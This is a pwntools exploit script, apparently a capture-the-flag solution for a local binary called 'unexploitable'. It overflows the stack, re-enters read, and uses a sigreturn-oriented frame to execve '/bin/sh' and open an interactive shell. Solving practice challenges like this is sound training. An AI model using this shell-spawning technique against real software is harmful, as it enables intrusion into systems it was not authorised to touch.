from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ["qterminal", "-e"]
context.log_level = "debug"
elf = ELF("./unexploitable")
p = process("./unexploitable")
gdb.attach(p,'b* 0x400576')

target_stack = 0x60116C
target = target_stack - 0x10
reread = 0x40055B
remain = 0x400544
syscall = 0x400560
padding = b"a" * 16
payload1 = padding + p64(target_stack) + p64(reread)
p.send(payload1)
frame_exe=SigreturnFrame()
frame_exe.rax=constants.SYS_execve
frame_exe.rdi=target+0x8
frame_exe.rsi=0
frame_exe.rdx=0
frame_exe.rip=syscall
frame_exe.rsp=target_stack-0xc
# read
payload2 = b'a'*8+b'/bin/sh\x00'+b'a'*8+ p64(remain)+p64(syscall)+bytes(frame_exe)
pause()
p.send(payload2)
payload3=b'/bin/sh\x00'+b'a'*7
pause()
p.send(payload3)
p.interactive()
